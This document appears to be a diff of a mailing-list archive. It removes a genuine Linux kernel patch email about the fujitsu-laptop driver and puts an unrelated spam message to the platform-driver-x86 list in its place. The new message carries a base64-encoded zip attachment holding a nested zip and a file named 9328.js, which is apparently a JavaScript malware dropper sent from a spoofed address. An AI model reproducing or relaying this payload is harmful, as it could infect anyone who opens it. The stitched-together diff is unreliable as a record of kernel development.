@@ -1,121 +1,71 @@
-From: =?UTF-8?q?Micha=C5=82=20K=C4=99pie=C5=84?= <kernel@kempniu.pl>
-Subject: [PATCH v2 1/8] platform/x86: fujitsu-laptop: distinguish current uses of device-specific data
-Date: Fri, 19 May 2017 09:44:41 +0200
-Message-ID: <20170519074448.12716-2-kernel@kempniu.pl>
-References: <20170519074448.12716-1-kernel@kempniu.pl>
+From: <susan.christian@state.sd.us>
+Subject: (unknown)
+Date: Fri, 19 May 2017 15:35:25 -0000
+Message-ID: <149520812575.6152.4104700283720401561@surnet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170519074448.12716-1-kernel@kempniu.pl>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Jonathan Woithe <jwoithe@just42.net>, Darren Hart <dvhart@infradead.org>, Andy Shevchenko <andy@infradead.org>
-Cc: platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org
-List-Id: platform-driver-x86.vger.kernel.org
+Content-Type: application/zip; name="57847049147979.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from ip-31-163-12-103.dsl.surnet.ru ([31.163.12.103]:34845 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751228AbdESPfa (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Fri, 19 May 2017 11:35:30 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-In portions of the driver which use device-specific data, rename local
-variables from fujitsu_bl and fujitsu_laptop to priv in order to clearly
-distinguish these parts from code that uses module-wide data.
-
-Signed-off-by: Michał Kępień <kernel@kempniu.pl>
----
- drivers/platform/x86/fujitsu-laptop.c | 48 +++++++++++++++++------------------
- 1 file changed, 24 insertions(+), 24 deletions(-)
-
-diff --git a/drivers/platform/x86/fujitsu-laptop.c b/drivers/platform/x86/fujitsu-laptop.c
-index 7f49d92914c9..024ef339179a 100644
---- a/drivers/platform/x86/fujitsu-laptop.c
-+++ b/drivers/platform/x86/fujitsu-laptop.c
-@@ -348,26 +348,26 @@ static const struct key_entry keymap_backlight[] = {
- 
- static int acpi_fujitsu_bl_input_setup(struct acpi_device *device)
- {
--	struct fujitsu_bl *fujitsu_bl = acpi_driver_data(device);
-+	struct fujitsu_bl *priv = acpi_driver_data(device);
- 	int ret;
- 
--	fujitsu_bl->input = devm_input_allocate_device(&device->dev);
--	if (!fujitsu_bl->input)
-+	priv->input = devm_input_allocate_device(&device->dev);
-+	if (!priv->input)
- 		return -ENOMEM;
- 
--	snprintf(fujitsu_bl->phys, sizeof(fujitsu_bl->phys),
--		 "%s/video/input0", acpi_device_hid(device));
-+	snprintf(priv->phys, sizeof(priv->phys), "%s/video/input0",
-+		 acpi_device_hid(device));
- 
--	fujitsu_bl->input->name = acpi_device_name(device);
--	fujitsu_bl->input->phys = fujitsu_bl->phys;
--	fujitsu_bl->input->id.bustype = BUS_HOST;
--	fujitsu_bl->input->id.product = 0x06;
-+	priv->input->name = acpi_device_name(device);
-+	priv->input->phys = priv->phys;
-+	priv->input->id.bustype = BUS_HOST;
-+	priv->input->id.product = 0x06;
- 
--	ret = sparse_keymap_setup(fujitsu_bl->input, keymap_backlight, NULL);
-+	ret = sparse_keymap_setup(priv->input, keymap_backlight, NULL);
- 	if (ret)
- 		return ret;
- 
--	return input_register_device(fujitsu_bl->input);
-+	return input_register_device(priv->input);
- }
- 
- static int fujitsu_backlight_register(struct acpi_device *device)
-@@ -541,27 +541,27 @@ static const struct dmi_system_id fujitsu_laptop_dmi_table[] = {
- 
- static int acpi_fujitsu_laptop_input_setup(struct acpi_device *device)
- {
--	struct fujitsu_laptop *fujitsu_laptop = acpi_driver_data(device);
-+	struct fujitsu_laptop *priv = acpi_driver_data(device);
- 	int ret;
- 
--	fujitsu_laptop->input = devm_input_allocate_device(&device->dev);
--	if (!fujitsu_laptop->input)
-+	priv->input = devm_input_allocate_device(&device->dev);
-+	if (!priv->input)
- 		return -ENOMEM;
- 
--	snprintf(fujitsu_laptop->phys, sizeof(fujitsu_laptop->phys),
--		 "%s/video/input0", acpi_device_hid(device));
-+	snprintf(priv->phys, sizeof(priv->phys), "%s/video/input0",
-+		 acpi_device_hid(device));
- 
--	fujitsu_laptop->input->name = acpi_device_name(device);
--	fujitsu_laptop->input->phys = fujitsu_laptop->phys;
--	fujitsu_laptop->input->id.bustype = BUS_HOST;
--	fujitsu_laptop->input->id.product = 0x06;
-+	priv->input->name = acpi_device_name(device);
-+	priv->input->phys = priv->phys;
-+	priv->input->id.bustype = BUS_HOST;
-+	priv->input->id.product = 0x06;
- 
- 	dmi_check_system(fujitsu_laptop_dmi_table);
--	ret = sparse_keymap_setup(fujitsu_laptop->input, keymap, NULL);
-+	ret = sparse_keymap_setup(priv->input, keymap, NULL);
- 	if (ret)
- 		return ret;
- 
--	return input_register_device(fujitsu_laptop->input);
-+	return input_register_device(priv->input);
- }
- 
- static int fujitsu_laptop_platform_add(void)
-@@ -863,11 +863,11 @@ static int acpi_fujitsu_laptop_add(struct acpi_device *device)
- 
- static int acpi_fujitsu_laptop_remove(struct acpi_device *device)
- {
--	struct fujitsu_laptop *fujitsu_laptop = acpi_driver_data(device);
-+	struct fujitsu_laptop *priv = acpi_driver_data(device);
- 
- 	fujitsu_laptop_platform_remove();
- 
--	kfifo_free(&fujitsu_laptop->fifo);
-+	kfifo_free(&priv->fifo);
- 
- 	return 0;
- }
--- 
-2.13.0
+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
+AAABAAEAWgAAAPsKAAAAAA==
